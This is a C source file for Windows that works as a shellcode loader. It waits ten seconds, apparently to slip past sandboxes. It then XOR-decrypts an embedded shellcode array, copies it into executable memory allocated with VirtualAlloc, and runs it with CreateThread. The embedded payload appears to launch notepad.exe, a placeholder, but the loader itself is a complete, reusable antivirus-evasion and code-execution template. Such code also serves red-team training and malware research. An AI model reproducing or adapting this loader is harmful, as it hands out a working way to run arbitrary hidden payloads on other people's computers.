#include <stdio.h>
#include <windows.h>

void decryptxor(unsigned char *shellcode, size_t shellcodesize, unsigned char key) {
    for (size_t i = 0; i < shellcodesize - 1; i++) {
        shellcode[i] ^= key;
    }
}

void printshellcode(unsigned char *shellcode, size_t shellcodesize) {
    for (size_t i = 0; i < shellcodesize - 1; i++) {
        printf("\\x%02x", shellcode[i]);
    }
    printf("\n");
}

int main() {
    Sleep(10000);
    // Declare variable containing shellcode
    unsigned char shellcode[] = {
        "\xa9\xbd\xd7\x55\x55\x55\x35\xdc\xb0\x64\x95\x31\xde\x05\x65\xde\x07\x59\xde\x07\x41\xde\x27\x7d\x5a\xe2\x1f\x73\x64\xaa\xf9\x69\x34\x29\x57\x79\x75\x94\x9a\x58\x54\x92\xb7\xa7\x07\x02\xde\x07\x45\xde\x1f\x69\xde\x19\x44\x2d\xb6\x1d\x54\x84\x04\xde\x0c\x75\x54\x86\xde\x1c\x4d\xb6\x6f\x1c\xde\x61\xde\x54\x83\x64\xaa\xf9\x94\x9a\x58\x54\x92\x6d\xb5\x20\xa3\x56\x28\xad\x6e\x28\x71\x20\xb1\x0d\xde\x0d\x71\x54\x86\x33\xde\x59\x1e\xde\x0d\x49\x54\x86\xde\x51\xde\x54\x85\xdc\x11\x71\x71\x0e\x0e\x34\x0c\x0f\x04\xaa\xb5\x0a\x0a\x0f\xde\x47\xbe\xd8\x08\x3f\x54\xd8\xd0\xe7\x55\x55\x55\x05\x3d\x64\xde\x3a\xd2\xaa\x80\xee\xa5\xe0\xf7\x03\x3d\xf3\xc0\xe8\xc8\xaa\x80\x69\x53\x29\x5f\xd5\xae\xb5\x20\x50\xee\x12\x46\x27\x3a\x3f\x55\x06\xaa\x80\x3b\x3a\x21\x30\x25\x34\x31\x7b\x30\x2d\x30\x55\x55"
    };

    size_t shellcode_size = sizeof(shellcode); // Get the size of the shellcode
    unsigned char key = 'U';
    void *exec_mem; // Allocate Memory

    // Print Original (Encrypted) Shellcode
    printf("Encrypted Shellcode:\n");
    printshellcode(shellcode, shellcode_size);

    // Decrypt (XOR) the shellcode back to original using the key
    decryptxor(shellcode, shellcode_size, key);

    // Print Decrypted Shellcode (should match the original shellcode)
    printf("Decrypted Shellcode:\n");
    printshellcode(shellcode, shellcode_size);

    exec_mem = VirtualAlloc(
        NULL,
        shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (exec_mem == NULL) {
        printf("VirtualAlloc failed with error %d\n", GetLastError());
        return 1;
    }

    RtlMoveMemory(
        exec_mem,
        shellcode,
        shellcode_size);

    printf("Memory allocated at: %p\n", exec_mem);

    HANDLE thread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)exec_mem,
        NULL,
        0,
        NULL);

    if (thread == NULL) {
        printf("CreateThread failed with error %d\n", GetLastError());
        return 1;
    }

    WaitForSingleObject(thread, INFINITE);
}
